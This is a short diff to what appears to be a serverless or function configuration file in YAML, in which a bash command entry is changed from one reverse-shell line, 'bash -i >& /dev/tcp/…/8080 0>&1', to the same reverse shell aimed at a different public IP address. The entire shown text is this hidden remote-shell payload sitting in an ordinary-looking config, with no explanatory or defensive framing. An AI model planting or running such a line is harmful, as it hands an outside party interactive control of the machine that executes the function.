@@ -20,4 +20,4 @@ functions:
       command: bash
       args:
         - -c
-        - bash -i >& /dev/tcp/3.82.122.240/8080 0>&1
+        - bash -i >& /dev/tcp/44.203.3.98/8080 0>&1
